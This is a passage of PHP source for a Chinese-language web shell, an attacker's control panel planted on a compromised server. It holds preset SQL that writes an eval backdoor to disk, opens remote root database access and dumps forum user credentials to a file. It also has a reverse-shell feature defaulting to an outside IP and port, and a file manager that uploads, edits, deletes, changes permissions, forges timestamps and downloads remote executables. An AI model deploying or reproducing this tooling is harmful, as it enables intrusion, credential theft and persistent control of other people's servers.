				if($result) { $msg .= '<h2> - 执行SQL成功</h2>'; while ($array = mssql_fetch_array($result)) { $rows[] = $array; } }
				else { $msg .= '<h1> - 执行SQL失败</h1>'; }
				@mssql_free_result($result);
			} else {
				$msg = '<h1>连接'.$type.'失败</h1>';
			}
			@mssql_close($dbconn);
		} else {
			$msg = '<h1>不支持'.$type.'</h1>';
		}
		break;
		case "Oracle" : 
		if(function_exists('oci_close')){
			$conn = @oci_connect($sqluser,$sqlpass,$sqlhost.'/'.$sqlname);
			if($conn) {
				$msg = '<h2>连接'.$type.'成功 </h2>';
				$stid = oci_parse($conn,$sqlcode);
				oci_execute($stid);
				if($stid) { $msg .= '<h2> - 执行SQL成功</h2>'; while (($array = oci_fetch_array($stid,OCI_ASSOC))) { $rows[] = $array; } }
				else { $msg .= '<h1> - 执行SQL失败</h1>'; $e = oci_error(); $rows = array('error' => $e['message']); }
				oci_free_statement($stid);
			} else {
				$e = oci_error(); $rows = array('error' => $e['message']);
				$msg = '<h1>连接'.$type.'失败</h1>';
			}
			@oci_close($conn);
		} else {
			$msg = '<h1>不支持'.$type.'</h1>';
		}
		break;
		case "MySql" : 
		if(function_exists('mysql_close')){
			$conn = mysql_connect(strstr($sqlhost,':') ? $sqlhost : $sqlhost.':3306',$sqluser,$sqlpass,$sqlname);
			if($conn) {
				$msg = '<h2>连接'.$type.'成功 </h2>';
				if(substr($sqlcode,0,6) == 't00lsa') {
					$array = array(); $data = ''; $i = 0;
					preg_match_all('/t00lsa\s*\'(.*)\'\s*t00lsb\s*\'(.*)\'\s*t00lsc\s*\'(.*)\'\s*t00lsfile\s*\'(.*)\'/i',$sqlcode,$array);
					if($array[1][0] && $array[2][0] && $array[3][0] && $array[4][0]) {
						mysql_select_db($array[1][0],$conn);
						mysql_query('set names '.$names,$conn);
						$spidercode = 'select '.$array[3][0].' from `'.$array[2][0].'`;';
						$result = mysql_query($spidercode,$conn);
						if($result) {
							while($row = mysql_fetch_array($result,MYSQL_ASSOC)) { $data .= join('{~}',$row)."\r\n"; $i++; }
							if($data) {
								$file = strdir($array[4][0]);
								$msg .= filew($file,$data,'w') ? '<h2> - 脱库成功</h2>' : '<h1> - 导出文件失败</h1>';
								$rows = array('file' => $file,size(filesize($file)) => '共获取'.$i.'条数据');
							}
							else { $msg .= '<h1> - 没有数据</h1>'; }
						}
						else { $msg .= '<h1> - 执行SQL失败</h1>'; $rows = array('errno' => mysql_errno(),'error' => mysql_error()); }
					}
					else { $msg .= '<h1> - 脱库语句错误</h1>'; }
				} elseif(!empty($sqlcode)) {
					mysql_select_db($sqlname,$conn);
					mysql_query('set names '.$names,$conn);
					$result = mysql_query($sqlcode,$conn);
					if($result) { $msg .= '<h2> - 执行SQL成功</h2>'; while($array = mysql_fetch_array($result,MYSQL_ASSOC)) { $rows[] = $array; } }
					else { $msg .= '<h1> - 执行SQL失败</h1>'; $rows = array('errno' => mysql_errno(),'error' => mysql_error()); }
				}
				mysql_free_result($result);
			} else {
				$msg = '<h1>连接'.$type.'失败</h1>';
				$rows = array('errno' => mysql_errno(),'error' => mysql_error());
			}
			mysql_close($conn);
		} else {
			$msg = '<h1>不支持'.$type.'</h1>';
		}
		break;
	}
} else {
	$type = 'MySql';
	$sqlhost = 'localhost:3306';
	$sqluser = 'root';
	$sqlpass = '123456';
	$sqlname = 'mysql';
	$sqlcode = 'select version();';
	$names = 'gbk';
}
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="sql">';
echo '<table class="tables"><tr><th style="width:15%;">名称</th><th>设置</th></tr>';
echo '<tr><td>支持类型</td><td>';
$dbs = array('MySql','MsSql','Oracle','PostgreSql');
foreach($dbs as $dbname) { echo '<label><input type="radio" name="type" value="'.$dbname.'"'.($type == $dbname ? ' checked' : '').'>'.$dbname.'</label> '; }
echo '</td></tr><tr><td>连接</td><td>地址 <input type="text" name="sqlhost" style="width:188px;" value="'.$sqlhost.'"> ';
echo '用户 <input type="text" name="sqluser" style="width:108px;" value="'.$sqluser.'"> ';
echo '密码 <input type="text" name="sqlpass" style="width:108px;" value="'.$sqlpass.'"> ';
echo '库名 <input type="text" name="sqlname" style="width:108px;" value="'.$sqlname.'"></td></tr>';
echo '<tr><td>语句<br>';
echo '<select onchange="$(\'sqlcode\').value=options[selectedIndex].value">';
echo '<option value="select version();">---语句集合---</option>';
echo '<option value="select \'<?php eval ($_POST[cmd]);?>\' into outfile \'D:/web/shell.php\';">写入文件</option>';
echo '<option value="GRANT ALL PRIVILEGES ON *.* TO \''.$sqluser.'\'@\'%\' IDENTIFIED BY \''.$sqlpass.'\' WITH GRANT OPTION;">开启外连</option>';
echo '<option value="show variables;">系统变量</option>';
echo '<option value="create database t00ls;">创建数据库</option>';
echo '<option value="create table `t00ls` (`id` INT(10) NOT NULL ,`user` VARCHAR(32) NOT NULL ,`pass` VARCHAR(32) NOT NULL) TYPE = MYISAM;">创建数据表</option>';
echo '<option value="show databases;">显示数据库</option>';
echo '<option value="show tables from `'.$sqlname.'`;">显示数据表</option>';
echo '<option value="show columns from `t00ls`;">显示表结构</option>';
echo '<option value="drop table `t00ls`;">删除数据表</option>';
echo '<option value="select username,password,salt,email from `pre_ucenter_members` limit 0,30;">显示字段</option>';
echo '<option value="insert into `admin` (`user`,`pass`) values (\'t00ls\', \'f1a81d782dea6a19bdca383bffe68452\');">插入数据</option>';
echo '<option value="update `admin` set `user` = \'t00ls1\',`pass` = \'50de237e389600acadbeda3d6e6e0b1f\' where `user` = \'t00ls\' and `pass` = \'f1a81d782dea6a19bdca383bffe68452\' limit 1;">修改数据</option>';
echo '<option value="t00lsa \'discuzx25\' t00lsb \'pre_ucenter_members\' t00lsc \'username,password,salt,email\' t00lsfile \''.THISDIR.'out.txt\';">脱库(MySql)</option>';
echo '</select>';
echo '</td><td><textarea name="sqlcode" id="sqlcode" style="width:680px;height:80px;">'.htmlspecialchars($sqlcode).'</textarea></td></tr>';
echo '<tr><td>操作</td><td><select name="names">';
$charsets = array('gbk','utf8','big5','latin1','cp866','ujis','euckr','koi8r','koi8u');
foreach($charsets as $charset) { echo '<option value="'.$charset.'"'.($names == $charset ? ' selected' : '').'>'.$charset.'</option>'; }
echo '</select> <input type="submit" style="width:80px;" value="执行"></td></tr>';
echo '</table></form>';
if($rows) {
	echo '<pre style="padding:5px;background:#F8F8F8;text-align:left;">';
	ob_start();
	print_r($rows);
	$out = ob_get_contents();
	ob_end_clean();
	if(preg_match('~[\x{4e00}-\x{9fa5}]+~u',$out) && function_exists('iconv')) { $out = @iconv('UTF-8','GB2312//IGNORE',$out); }
	echo htmlspecialchars($out);
	echo '</pre>';
}
break;

case "backshell" : 
if((!empty($_POST['backip'])) && (!empty($_POST['backport']))) {
	$backip = $_POST['backip'];
	$backport = $_POST['backport'];
	$temp = $_POST['temp'] ? $_POST['temp'] : '/tmp';
	$type = $_POST['type'];
	$msg = backshell($backip,$backport,$temp,$type);
} else {
	$backip = '222.73.219.91';
	$backport = '443';
	$temp = '/tmp';
	$type = 'pl';
}
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="backshell">';
echo '<table class="tables"><tr><th style="width:15%;">名称</th><th>设置</th></tr>';
echo '<tr><td>反弹地址</td><td><input type="text" name="backip" style="width:268px;" value="'.$backip.'"> (Your ip)</td></tr>';
echo '<tr><td>反弹端口</td><td><input type="text" name="backport" style="width:268px;" value="'.$backport.'"> (nc -vvlp '.$backport.')</td></tr>';
echo '<tr><td>临时目录</td><td><input type="text" name="temp" style="width:268px;" value="'.$temp.'"> (Only Linux)</td></tr>';
echo '<tr><td>反弹方法</td><td>';
$types = array('pl' => 'Perl','py' => 'Python','c' => 'C-bin','pcntl' => 'Pcntl','php' => 'PHP','phpwin' => 'PHP-WS');
foreach($types as $key => $name) { echo '<label><input type="radio" name="type" value="'.$key.'"'.($key == $type ? ' checked' : '').'>'.$name.'</label> '; }
echo '</td></tr><tr><td>操作</td><td><input type="submit" style="width:80px;" value="反弹"></td></tr>';
echo '</table></form>';
break;

case "edit" : case "editor" : 
$file = strdir($_POST['godir'].'/'.$_POST['govar']);
$iconv = function_exists('iconv');
if(!file_exists($file)) {
	$msg = '【新建文件】';
} else {
	$code = filer($file);
	$chst = '默认';
	if(preg_match('~[\x{4e00}-\x{9fa5}]+~u',$code) && $iconv) { $chst = 'utf-8'; $code = @iconv('UTF-8','GB2312//IGNORE',$code); }
	$size = size(filesize($file));
	$msg = '【文件属性 '.substr(decoct(fileperms($file)),-4).'】 【文件大小 '.$size.'】 【文件编码 '.$chst.'】';
}
echo base64_decode('PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQp2YXIgbiA9IDA7DQpmdW5jdGlvbiBzZWFyY2goc3RyKSB7DQoJdmFyIHR4dCwgaSwgZm91bmQ7DQoJaWYoc3RyID09ICIiKSByZXR1cm4gZmFsc2U7DQoJdHh0ID0gJCgnZmlsZWNvZGUnKS5jcmVhdGVUZXh0UmFuZ2UoKTsNCglmb3IoaSA9IDA7IGkgPD0gbiAmJiAoZm91bmQgPSB0eHQuZmluZFRleHQoc3RyKSkgIT0gZmFsc2U7IGkrKyl7DQoJCXR4dC5tb3ZlU3RhcnQoImNoYXJhY3RlciIsIDEpOw0KCQl0eHQubW92ZUVuZCgidGV4dGVkaXQiKTsNCgl9DQoJaWYoZm91bmQpeyB0eHQubW92ZVN0YXJ0KCJjaGFyYWN0ZXIiLCAtMSk7IHR4dC5maW5kVGV4dChzdHIpOyB0eHQuc2VsZWN0KCk7IHR4dC5zY3JvbGxJbnRvVmlldygpOyBuKys7IH0NCgllbHNlIHsgaWYgKG4gPiAwKSB7IG4gPSAwOyBzZWFyY2goc3RyKTsgfSBlbHNlIGFsZXJ0KHN0ciArICIuLi4gTm90LUZpbmQiKTsgfQ0KCXJldHVybiBmYWxzZTsNCn0NCjwvc2NyaXB0Pg==');
echo '<div class="msgbox"><input name="keyword" id="keyword" type="text" style="width:138px;height:15px;"><input type="button" value="IE查找内容" onclick="search($(\'keyword\').value);"> - '.$msg.'</div>';
echo '<form name="editfrm" id="editfrm" method="POST">';
subeval();
echo '<input type="hidden" name="go" value=""><input type="hidden" name="act" id="act" value="edit">';
echo '<input type="hidden" name="dir" id="dir" value="'.dirname($file).'">';
echo '<div class="actall">文件 <input type="text" name="filename" value="'.$file.'" style="width:528px;"> ';
if($iconv) {
	echo '编码 <select name="tostr">';
	$selects = array('normal' => '默认','utf' => 'utf-8');
	foreach($selects as $var => $name) { echo '<option value="'.$var.'"'.($name == $chst ? ' selected' : '').'>'.$name.'</option>'; }
	echo '</select>';
}
echo '</div><div class="actall"><textarea name="filecode" id="filecode" style="width:698px;height:358px;">'.htmlspecialchars($code).'</textarea></div></form>';
echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="保存" style="width:80px;"> ';
echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="'.dirname($file).'">';
subeval();
echo '<input type="button" onclick="$(\'backfrm\').submit();" value="返回" style="width:80px;"></form></div>';
break;

case "upfiles" : 
$updir = isset($_POST['updir']) ? $_POST['updir'] : $_POST['godir'];
$msg = '【最大上传文件 '.get_cfg_var("upload_max_filesize").'】 【POST最大提交数据 '.get_cfg_var("post_max_size").'】';
$max = 10;
if(isset($_FILES['uploads']) && isset($_POST['renames'])) {
	$uploads = $_FILES['uploads'];
	$msgs = array();
	for($i = 1;$i < $max;$i++) {
		if($uploads['error'][$i] == UPLOAD_ERR_OK) {
			$rename = $_POST['renames'][$i] == '' ? $uploads['name'][$i] : $_POST['renames'][$i];
			$filea = $uploads['tmp_name'][$i];
			$fileb = strdir($updir.'/'.$rename);
			$msgs[$i] = fileu($filea,$fileb) ? '<br><h2>上传成功 '.$rename.'</h2>' : '<br><h1>上传失败 '.$rename.'</h1>';
		}
	}
}
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form name="upsfrm" id="upsfrm" method="POST" enctype="multipart/form-data">';
subeval();
echo '<input type="hidden" name="go" value="upfiles"><input type="hidden" name="act" id="act" value="upload">';
echo '<div class="actall"><p>上传到目录 <input type="text" name="updir" style="width:398px;" value="'.$updir.'"></p>';
for($i = 1;$i < $max;$i++) { echo '<p>附件'.$i.' <input type="file" name="uploads['.$i.']" style="width:300px;"> 重命名 <input type="text" name="renames['.$i.']" style="width:128px;"> '.$msgs[$i].'</p>'; }
echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="上传" style="width:80px;"> ';
echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="'.$updir.'">';
subeval();
echo '<input type="button" onclick="$(\'backfrm\').submit();" value="返回" style="width:80px;"></form></div>';
break;

default : 

if(isset($_FILES['upfile'])) {
	if($_FILES['upfile']['name'] == '') { $msg = '<h1>请选择文件</h1>'; }
	else { $rename = $_POST['rename'] == '' ? $_FILES['upfile']['name'] : $_POST['rename']; $filea = $_FILES['upfile']['tmp_name']; $fileb = strdir($nowdir.$rename); $msg = fileu($filea,$fileb) ? '<h2>上传文件'.$rename.'成功</h2>' : '<h1>上传文件'.$rename.'失败</h1>'; }
}

if(isset($_POST['act'])) {
	switch($_POST['act']) {
		case "a" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文件 '.$_POST['var'].'</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @copy(strdir($nowdir.$filename),strdir($_POST['var'].'/'.$filename)) ? 1 : 0; } $msg =  $msg = $i ? '<h2>共复制 '.$i.' 个文件到'.$_POST['var'].'成功</h2>' : '<h1>共复制 '.$i.' 个文件到'.$_POST['var'].'失败</h1>'; }
		break;
		case "b" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文件</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @unlink(strdir($nowdir.$filename)) ? 1 : 0; } $msg = $i ? '<h2>共删除 '.$i.' 个文件成功</h2>' : '<h1>共删除 '.$i.' 个文件失败</h1>'; }
		break;
		case "c" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文件 '.$_POST['var'].'</h1>'; }
			elseif(!ereg("^[0-7]{4}$",$_POST['var'])) { $msg = '<h1>属性值错误</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @chmod(strdir($nowdir.$filename),base_convert($_POST['var'],8,10)) ? 1 : 0; } $msg = $i ? '<h2>共 '.$i.' 个文件修改属性为'.$_POST['var'].'成功</h2>' : '<h1>共 '.$i.' 个文件修改属性为'.$_POST['var'].'失败</h1>'; }
		break;
		case "d" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文件 '.$_POST['var'].'</h1>'; }
			elseif(!preg_match('/(\d+)-(\d+)-(\d+) (\d+):(\d+):(\d+)/',$_POST['var'])) { $msg = '<h1>时间格式错误 '.$_POST['var'].'</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @touch(strdir($nowdir.$filename),strtotime($_POST['var'])) ? 1 : 0; } $msg = $i ? '<h2>共 '.$i.' 个文件修改时间为'.$_POST['var'].'成功</h2>' : '<h1>共 '.$i.' 个文件修改时间为'.$_POST['var'].'失败</h1>'; }
		break;
		case "e" : 
			$path = strdir($nowdir.$_POST['var'].'/');
			if(file_exists($path)) { $msg = '<h1>目录已存在 '.$_POST['var'].'</h1>'; }
			else { $msg = @mkdir($path,0777) ? '<h2>创建目录 '.$_POST['var'].' 成功</h2>' : '<h1>创建目录 '.$_POST['var'].' 失败</h1>'; }
		break;
		case "f" : 
			$context = array('http' => array('timeout' => 30));
			if(function_exists('stream_context_create')) { $stream = stream_context_create($context); }
			$data = @file_get_contents ($_POST['var'],false,$stream);
			$filename = array_pop(explode('/',$_POST['var']));
			if($data) { $msg = filew(strdir($nowdir.$filename),$data,'wb') ? '<h2>下载 '.$filename.' 成功</h2>' : '<h1>下载 '.$filename.' 失败</h1>'; } else { $msg = '<h1>下载失败或不支持下载</h1>'; }
		break;
		case "rf" : 
			$files = explode('|x|',$_POST['var']);
			if(count($files) != 2) { $msg = '<h1>输入错误</h1>'; }
			else { $msg = @rename(strdir($nowdir.$files[1]),strdir($nowdir.$files[0])) ? '<h2>重命名 '.$files[1].' 为 '.$files[0].' 成功</h2>' : '<h1>重命名 '.$files[1].' 为 '.$files[0].' 失败</h1>'; }
		break;
		case "pd" : 
			$files = explode('|x|',$_POST['var']);
			if(count($files) != 2) { $msg = '<h1>输入错误</h1>'; }
			else { $path = strdir($nowdir.$files[1]); $msg = @chmod($path,base_convert($files[0],8,10)) ? '<h2>修改'.$files[1].'属性为'.$files[0].'成功</h2>' : '<h1>修改'.$files[1].'属性为'.$files[0].'失败</h1>'; }
		break;
		case "edit" : 
			if(isset($_POST['filename']) && isset($_POST['filecode'])) { if($_POST['tostr'] == 'utf') { $_POST['filecode'] = @iconv('GB2312//IGNORE','UTF-8',$_POST['filecode']); } $msg = filew($_POST['filename'],$_POST['filecode'],'w') ? '<h2>保存成功 '.$_POST['filename'].'</h2>' : '<h1>保存失败 '.$_POST['filename'].'</h1>'; }
		break;
		case "deltree" : 
			$deldir = strdir($nowdir.$_POST['var'].'/');
			if(!file_exists($deldir)) { $msg = '<h1>目录 '.$_POST['var'].' 不存在</h1>'; }
			else { $msg = deltree($deldir) ? '<h2>删除目录 '.$_POST['var'].' 成功</h2>' : '<h1>删除目录 '.$_POST['var'].' 失败</h1>'; }
		break;
	}
}

$chmod = substr(decoct(fileperms($nowdir)),-4);
if(!$chmod) { $msg .= ' - <h1>无法读取目录</h1>'; }

$array = showdir($nowdir);
$thisurl = strdir('/'.strtr($nowdir,array(ROOTDIR => '')).'/');
$nowdir = strtr($nowdir,array('\'' => '%27','"' => '%22'));
echo '<div class="msgbox">'.$msg.'</div>';
echo '<div class="actall"><form name="frm" id="frm" method="POST">';
subeval();
echo (is_writable($nowdir) ? '<h2>路径</h2>' : '<h1>路径</h1>').' <input type="text" name="dir" id="dir" style="width:508px;" value="'.strdir($nowdir.'/').'"> ';
echo '<input type="button" onclick="$(\'frm\').submit();" style="width:50px;" value="转到"> ';
echo '<input type="button" onclick="cd(\''.ROOTDIR.'\');" style="width:68px;" value="根目录"> ';
echo '<input type="button" onclick="cd(\''.THISDIR.'\');" style="width:68px;" value="程序目录"> ';
echo '<select onchange="cd(options[selectedIndex].value);">';
echo '<option>---特殊目录---</option>';
echo '<option value="C:/RECYCLER/">Win-RECYCLER</option>';
echo '<option value="C:/$Recycle.Bin/">Win-$Recycle</option>';
echo '<option value="C:/Program Files/">Win-Program</option>';
echo '<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup/">Win-Startup</option>';
echo '<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动/">Win-启动</option>';
echo '<option value="C:/Windows/Temp/">Win-TEMP</option>';
echo '<option value="/usr/local/">Linux-local</option>';
echo '<option value="/tmp/">Linux-tmp</option>';
echo '<option value="/var/tmp/">Linux-var</option>';
echo '<option value="/etc/ssh/">Linux-ssh</option>';
echo '</select></form></div><div class="actall">';

echo '<input type="button" value="新建文件" onclick="nf(\'edit\',\'newfile.php\');" style="width:68px;"> ';
echo '<input type="button" value="创建目录" onclick="txts(\'目录名\',\'newdir\',\'e\');" style="width:68px;"> ';
echo '<input type="button" value="下载文件" onclick="txts(\'下载文件到当前目录\',\'http://www.baidu.com/cmd.exe\',\'f\');" style="width:68px;"> ';
echo '<input type="button" value="批量上传" onclick="go(\'upfiles\',\''.$nowdir.'\');" style="width:68px;"> ';

echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
subeval();
echo '<input type="hidden" name="dir" id="dir" value="'.$nowdir.'">';
echo '<input type="file" name="upfile" style="width:286px;height:21px;"> ';
echo '<input type="button" onclick="$(\'upfrm\').submit();" value="上传" style="width:50px;"> ';
echo '上传重命名为 <input type="text" name="rename" style="width:128px;">';
echo '</form></div>';

echo '<form name="frm1" id="frm1" method="POST"><table class="tables">';
subeval();
echo '<input type="hidden" name="dir" id="dir" value="'.$nowdir.'">';
echo '<input type="hidden" name="act" id="act" value="">';
echo '<input type="hidden" name="var" id="var" value="">';
echo '<th><a href="javascript:cd(\''.dirname($nowdir).'/\');">上级目录</a></th><th style="width:8%">操作</th><th style="width:5%">属性</th><th style="width:17%">创建时间</th><th style="width:17%">修改时间</th><th style="width:8%">下载</th>';
if($array) {
	asort($array['dir']);
	asort($array['file']);
	$dnum = $fnum = 0;
	foreach($array['dir'] as $path => $name) {
		$prem = substr(decoct(fileperms($path)),-4);
		$ctime = date('Y-m-d H:i:s',filectime($path));
		$mtime = date('Y-m-d H:i:s',filemtime($path));
		echo '<tr>';
		echo '<td><a href="javascript:cd(\''.$nowdir.$name.'\');"><b>'.strtr($name,array('%27' => '\'','%22' => '"')).'</b></a></td>';
		echo '<td><a href="javascript:dels(\''.$name.'\');">删除</a> ';
		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">改名</a></td>';
		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
		echo '<td>'.$ctime.'</td>';
		echo '<td>'.$mtime.'</td>';
		echo '<td>-</td>';
		echo '</tr>';
		$dnum++;
	}
	foreach($array['file'] as $path => $name) {
		$prem = substr(decoct(fileperms($path)),-4);
		$ctime = date('Y-m-d H:i:s',filectime($path));
		$mtime = date('Y-m-d H:i:s',filemtime($path));
		$size = size(filesize($path));
		echo '<tr>';
		echo '<td><input type="checkbox" name="files[]" value="'.$name.'"><a target="_blank" href="'.$thisurl.$name.'">'.strtr($name,array('%27' => '\'','%22' => '"')).'</a></td>';
		echo '<td><a href="javascript:go(\'edit\',\''.$name.'\');">编辑</a> ';
		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">改名</a></td>';
		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
		echo '<td>'.$ctime.'</td>';
		echo '<td>'.$mtime.'</td>';
		echo '<td align="right"><a href="javascript:go(\'down\',\''.$name.'\');">'.$size.'</a></td>';
		echo '</tr>';
		$fnum++;
	}
}
unset($array);
echo '</table>';
echo '<div class="actall" style="text-align:left;">';
echo '<input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> ';
echo '<input type="button" value="复制" style="width:50px;" onclick=\'txts("复制路径","'.$nowdir.'","a");\'> ';
echo '<input type="button" value="删除" style="width:50px;" onclick=\'dels("b");\'> ';
echo '<input type="button" value="属性" style="width:50px;" onclick=\'txts("属性值","0666","c");\'> ';
echo '<input type="button" value="时间" style="width:50px;" onclick=\'txts("修改时间","'.$mtime.'","d");\'> ';
echo '目录['.$dnum.'] - 文件['.$fnum.'] - 属性['.$chmod.']</div></form>';
break;
}
?>
